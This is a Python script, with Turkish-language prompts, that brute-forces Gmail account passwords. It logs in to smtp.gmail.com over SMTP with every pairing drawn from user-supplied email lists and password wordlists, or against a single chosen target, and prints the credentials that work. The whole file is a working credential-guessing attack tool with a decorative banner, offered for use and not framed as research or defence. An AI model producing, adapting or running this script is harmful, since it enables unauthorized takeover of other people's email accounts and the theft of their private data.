from __future__ import absolute_import
from __future__ import print_function
from six.moves import input
import smtplib
from time import sleep

class GmailBruteForce():
    def __init__(self):
        self.accounts = []
        self.passwords = []
        self.init_smtplib()

    def get_acc_list(self,path):
        file = open(path, 'r',encoding='utf8').read().splitlines()
        for line in file:
            self.accounts.append(line)

    def get_pass_list(self,path):
        file = open(path, 'r',encoding='utf8').read().splitlines()
        for line in file:
            self.passwords.append(line)

    def init_smtplib(self):
        self.smtp = smtplib.SMTP("smtp.gmail.com",587)
        self.smtp.starttls()
        self.smtp.ehlo()
    
    def try_gmail(self):

        for user in self.accounts:
            for password in self.passwords:
                try:
                    self.smtp.login(user,password)
                    sleep(1)
                    print(("\033[1;37moldu -> %s " % user + " -> %s \033[1;m" % password ))
                    self.smtp.quit()
                    self.init_smtplib()
                    break;
                except:
                    sleep(1)
                    # print("\033[1;31msorry \033[1;m")
                    print(("\033[1;31molmadı %s <- " % user + " -> %s \033[1;m" % password ))

print('''
  ____                                ____             _            
 |  _ \                              |  _ \           | |           
 | |_) | __ _ _ __  _ __   ___ _ __  | |_) |_ __ _   _| |_ ___ _ __ 
 |  _ < / _` | '_ \| '_ \ / _ \ '__| |  _ <| '__| | | | __/ _ \ '__|
 | |_) | (_| | | | | | | |  __/ |    | |_) | |  | |_| | ||  __/ |   
 |____/ \__,_|_| |_|_| |_|\___|_|    |____/|_|   \__,_|\__\___|_|   
                                                                    
	''')

instance = GmailBruteForce()

do = input('''
		Bir tane opsiyon seç?
		1 - Klasik Dosyadan Brute
		2 - Hedef Belirle
		
		==> ''')

if do == '1':
    user = input("Mail Listesi => ")
    passfile = input("Şifre Listesi => ")

    instance.get_acc_list(user)
    instance.get_pass_list(passfile)
    headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

    instance.try_gmail()
    sleep(1)
   
############
if do == '2':
    user = input("Mail : ")
    senha = input("Wordlist : ")
    headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

    instance.accounts.append(user)
    instance.get_pass_list(senha)

    instance.try_gmail()
    sleep(1)
